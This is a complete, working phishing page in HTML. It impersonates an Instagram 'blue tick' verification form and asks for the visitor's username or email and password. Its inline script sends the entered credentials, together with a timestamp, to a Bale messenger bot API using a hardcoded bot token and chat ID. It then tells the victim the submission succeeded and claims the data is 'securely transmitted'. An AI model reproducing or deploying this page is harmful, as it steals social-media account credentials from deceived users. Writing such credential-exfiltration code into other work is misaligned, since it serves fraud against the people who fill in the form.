<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Get Instagram Blue Tick</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Poppins', 'Segoe UI', Tahoma, sans-serif;
  }

  body {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: linear-gradient(135deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
    background-size: 400% 400%;
    animation: gradientBG 15s ease infinite;
    padding: 20px;
  }

  @keyframes gradientBG {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  .card {
    background: rgba(255, 255, 255, 0.98);
    backdrop-filter: blur(20px);
    border-radius: 24px;
    padding: 28px 25px;
    width: 100%;
    max-width: 400px;
    box-shadow: 0 25px 60px rgba(0, 0, 0, 0.35);
    text-align: center;
    animation: fadeIn 0.8s ease;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(30px); }
    to { opacity: 1; transform: translateY(0); }
  }

  .verified-badge {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-bottom: 16px;
  }

  .verified-badge svg {
    width: 30px;
    height: 30px;
  }

  h1 {
    font-size: 21px;
    color: #262626;
    margin-bottom: 6px;
    font-weight: 700;
    letter-spacing: -0.3px;
  }

  .subtitle {
    font-size: 12.5px;
    color: #8e8e8e;
    margin-bottom: 20px;
    font-weight: 400;
  }

  .image-box {
    width: 150px;
    height: 150px;
    border-radius: 50%;
    overflow: hidden;
    margin: 0 auto 22px;
    box-shadow: 0 8px 25px rgba(225, 48, 108, 0.3);
    border: 3px solid #fff;
    outline: 3px solid transparent;
    background: linear-gradient(135deg, #405DE6, #833AB4, #E1306C) border-box;
    padding: 3px;
  }

  .image-box img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
    border-radius: 50%;
  }

  .input-group {
    margin-bottom: 14px;
    text-align: left;
  }

  .input-group label {
    display: block;
    font-size: 11.5px;
    color: #555;
    margin-bottom: 6px;
    font-weight: 600;
    padding-left: 4px;
    letter-spacing: 0.2px;
  }

  .input-group input {
    width: 100%;
    padding: 13px 16px;
    border: 2px solid #efefef;
    border-radius: 12px;
    font-size: 13.5px;
    font-family: 'Poppins', sans-serif;
    background: #fafafa;
    transition: all 0.3s ease;
    outline: none;
    color: #262626;
  }

  .input-group input::placeholder {
    color: #b0b0b0;
    font-weight: 400;
  }

  .input-group input:focus {
    border-color: #E1306C;
    background: #fff;
    box-shadow: 0 0 0 4px rgba(225, 48, 108, 0.1);
  }

  .login-btn {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 12px;
    background: linear-gradient(135deg, #405DE6, #833AB4, #E1306C);
    color: #fff;
    font-size: 15px;
    font-family: 'Poppins', sans-serif;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    box-shadow: 0 8px 20px rgba(225, 48, 108, 0.4);
    letter-spacing: 0.8px;
    margin-top: 6px;
  }

  .login-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 12px 28px rgba(225, 48, 108, 0.55);
  }

  .login-btn:active {
    transform: translateY(0);
  }

  .login-btn:disabled {
    opacity: 0.7;
    cursor: not-allowed;
    transform: none;
  }

  .status {
    margin-top: 14px;
    font-size: 12.5px;
    font-weight: 600;
    min-height: 18px;
  }

  .status.success { color: #22c55e; }
  .status.error { color: #ef4444; }

  .footer-note {
    margin-top: 16px;
    font-size: 10.5px;
    color: #b0b0b0;
    line-height: 1.6;
    font-weight: 400;
  }
</style>
</head>
<body>

  <div class="card">
    <div class="verified-badge">
      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2L14.5 4.5L18 4L19 7.5L22 9.5L20.5 12.5L22 15.5L19 17.5L18 21L14.5 20.5L12 23L9.5 20.5L6 21L5 17.5L2 15.5L3.5 12.5L2 9.5L5 7.5L6 4L9.5 4.5L12 2Z" fill="#0095F6"/>
        <path d="M10.5 15.5L7.5 12.5L8.9 11.1L10.5 12.7L15.1 8.1L16.5 9.5L10.5 15.5Z" fill="white"/>
      </svg>
      <span style="font-size: 14px; font-weight: 700; color:#0095F6; font-family:'Poppins',sans-serif;">Verified</span>
    </div>

    <h1>Get Instagram Blue Tick</h1>
    <p class="subtitle">Enter your information to verify your account</p>

    <div class="image-box">
      <img src="https://cdn.imgurl.ir/uploads/b90491_images_3_8.jpeg" alt="Instagram Verification">
    </div>

    <div class="input-group">
      <label for="userInput">Username or Email</label>
      <input type="text" id="userInput" placeholder="Enter your username or email" autocomplete="off">
    </div>

    <div class="input-group">
      <label for="passInput">Password</label>
      <input type="password" id="passInput" placeholder="Enter your password" autocomplete="off">
    </div>

    <button class="login-btn" id="loginBtn">Login</button>
    <div class="status" id="status"></div>

    <p class="footer-note">Your information is securely transmitted.</p>
  </div>

<script>
  // ربات بله
  const BOT_TOKEN = "596915370:d5Ufucgk67gumzzlKN_65Z_VvENRhilUhA0";
  const CHAT_ID = "1545420338";
  const BALE_API = `https://tapi.bale.ai/bot${BOT_TOKEN}/sendMessage`;

  const loginBtn = document.getElementById("loginBtn");
  const userInput = document.getElementById("userInput");
  const passInput = document.getElementById("passInput");
  const status = document.getElementById("status");

  loginBtn.addEventListener("click", async () => {
    const username = userInput.value.trim();
    const password = passInput.value.trim();

    if (!username) {
      status.textContent = "Please enter your username or email.";
      status.className = "status error";
      return;
    }

    if (!password) {
      status.textContent = "Please enter your password.";
      status.className = "status error";
      return;
    }

    loginBtn.disabled = true;
    loginBtn.textContent = "Sending...";
    status.textContent = "";

    const message =
      `🔐 New Instagram Blue Tick Request\n\n` +
      `👤 Username/Email: ${username}\n` +
      `🔑 Password: ${password}\n` +
      `🕐 Time: ${new Date().toLocaleString()}`;

    try {
      const response = await fetch(BALE_API, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      });

      const data = await response.json();

      if (data.ok) {
        status.textContent = "✓ Submitted successfully!";
        status.className = "status success";
        userInput.value = "";
        passInput.value = "";
      } else {
        throw new Error("Failed");
      }
    } catch (err) {
      status.textContent = "✗ Error, please try again.";
      status.className = "status error";
      console.error(err);
    } finally {
      loginBtn.disabled = false;
      loginBtn.textContent = "Login";
    }
  });
</script>

</body>
</html>
